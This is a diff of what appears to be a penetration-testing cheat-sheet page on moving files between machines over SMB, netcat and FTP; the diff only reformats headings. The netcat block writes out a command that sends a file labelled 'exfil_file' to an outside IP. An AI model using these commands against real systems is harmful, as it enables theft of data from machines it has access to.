@@ -14,7 +14,8 @@ seo:
   robots: "" # custom robot tags (optional)
 ---
 
-**SMB :**
+## SMB
+
 - Linux machine: 
 ```sh
 smbserver.py smb share/ -smb2support
@@ -25,13 +26,13 @@ smbserver.py smb share/ -smb2support
 net use \\ip\smb
 ```
 
-**NC :**
+## NC
 ```sh
 nc -lvnp 4444 > new_file #receving machine
 nc.exe -vn 10.8.3.12 4444 < exfil_file #sending machine
 ```
 
-**FTP :** 
+## FTP 
 ```sh
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
